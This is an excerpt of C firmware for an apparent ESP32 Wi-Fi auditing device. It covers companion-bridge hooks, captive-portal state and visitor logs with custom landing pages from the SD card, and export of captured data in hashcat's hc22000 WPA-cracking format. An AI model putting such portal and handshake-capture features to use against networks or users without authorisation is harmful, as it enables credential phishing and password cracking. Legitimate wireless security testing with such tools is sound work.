void     nocsif_wifi_companion_set(bool on)  { post(on ? CMD_COMPANION_ON : CMD_COMPANION_OFF, NULL, NULL); }
void     nocsif_wifi_companion_set_cmd_handler(nocsif_companion_cmd_fn_t fn) { s_comp_cmd_fn = fn; }
void     nocsif_wifi_companion_set_menu_fn(nocsif_companion_json_fn_t fn)    { s_comp_menu_fn = fn; }
void     nocsif_wifi_companion_set_state_fn(nocsif_companion_json_fn_t fn)   { s_comp_state_fn = fn; }
void     nocsif_wifi_companion_set_touch_fn(nocsif_companion_touch_fn_t fn)  { s_comp_touch_fn = fn; }

/* §4.15 desktop bridge — the same hooks over the USB console (no companion surface required). */
bool nocsif_wifi_companion_dispatch(const nocsif_companion_cmd_t *cmd)
{
    if (!s_comp_cmd_fn || !cmd) return false;
    ESP_LOGI(TAG, "bridge cmd: type=%d arg=\"%s\"", (int)cmd->type, cmd->arg);
    s_comp_cmd_fn(cmd);
    return true;
}
bool nocsif_wifi_companion_menu_json(char *buf, size_t len)
{
    if (!s_comp_menu_fn || !buf || len == 0) return false;
    buf[0] = '\0';
    s_comp_menu_fn(buf, len);
    return buf[0] != '\0';
}
bool nocsif_wifi_companion_state_json(char *buf, size_t len)
{
    if (!s_comp_state_fn || !buf || len == 0) return false;
    buf[0] = '\0';
    s_comp_state_fn(buf, len);
    return buf[0] != '\0';
}
bool nocsif_wifi_companion_touch(int x, int y, int pressed)
{
    if (!s_comp_touch_fn) return false;
    s_comp_touch_fn(x, y, pressed);
    return true;
}
bool     nocsif_wifi_portal_active(void)     { return s_portal_active; }
uint32_t nocsif_wifi_portal_hits(void)       { return s_portal_hits; }
uint32_t nocsif_wifi_portal_gen(void)        { return s_portal_gen; }

const char *nocsif_wifi_portal_page_src(void)
{
    if (!s_portal_active || !s_portal_page_tried) {
        return "";
    }
    return (s_portal_page && s_portal_page_len > 0) ? "sd" : "built-in";
}

int nocsif_wifi_portal_log_count(void)
{
    int c;
    portENTER_CRITICAL(&s_portal_mux);
    c = s_portal_log_cnt;
    portEXIT_CRITICAL(&s_portal_mux);
    return c;
}

bool nocsif_wifi_portal_log_get(int idx, char *out, size_t len)
{
    bool ok = false;
    portENTER_CRITICAL(&s_portal_mux);
    if (idx >= 0 && idx < s_portal_log_cnt) {           /* idx 0 = newest */
        int slot = (s_portal_log_head - 1 - idx + PORTAL_LOG_MAX * 2) % PORTAL_LOG_MAX;
        if (out && len) { snprintf(out, len, "%s", s_portal_log[slot]); }
        ok = true;
    }
    portEXIT_CRITICAL(&s_portal_mux);
    return ok;
}

const char *nocsif_wifi_portal_tag_str(void)
{
    static char buf[16];
    if (s_portal_active) {
        uint32_t h = s_portal_hits;
        if (h == 0) {
            return "on";
        }
        snprintf(buf, sizeof buf, "%u hits", (unsigned)h);
        return buf;
    }
    return "off";
}

/* The chosen landing-page filename ("" = the built-in notice). Module-owned; safe on the LVGL task. */
const char *nocsif_wifi_portal_selected_page(void)
{
    portal_sel_ensure_loaded();
    return s_portal_page_sel;
}

/* Select the landing page by filename (a name under /sd/nocsif/wifi/portals/, or "" for the built-in
 * notice). Cached + persisted; a running portal re-serves it at once. LVGL-task-safe. */
void nocsif_wifi_portal_set_page(const char *name)
{
    portal_sel_ensure_loaded();
    char clean[PT_SEL_MAX];
    snprintf(clean, sizeof clean, "%s", name ? name : "");
    portENTER_CRITICAL(&s_portal_mux);
    memcpy(s_portal_page_sel, clean, sizeof clean);
    portEXIT_CRITICAL(&s_portal_mux);
    nocsif_settings_set_str(K_PT_PAGE, clean);
    if (s_portal_active) { post(CMD_PORTAL_RELOAD, NULL, NULL); }
}

/* ---- hc22000 export request + state (M5 passive polish) ---------------------------- */
void nocsif_wifi_request_export_hc22000(void) { post(CMD_EXPORT_HC, NULL, NULL); }
const char *nocsif_wifi_hc_path(void)         { return s_hc_path; }

const char *nocsif_wifi_hc_status_str(void)
{
    static char buf[48];
    switch (s_hc_state) {
        case HC_BUSY:      return "exporting\xE2\x80\xA6";
        case HC_DONE:      snprintf(buf, sizeof buf, "%d line%s written",
                                    s_hc_lines, s_hc_lines == 1 ? "" : "s"); return buf;
        case HC_NOSD:      return "no microSD card";
        case HC_FILESHARE: return "SD busy (File Share)";
        case HC_ERR:       return "export error";
        default:           return "";
    }
}
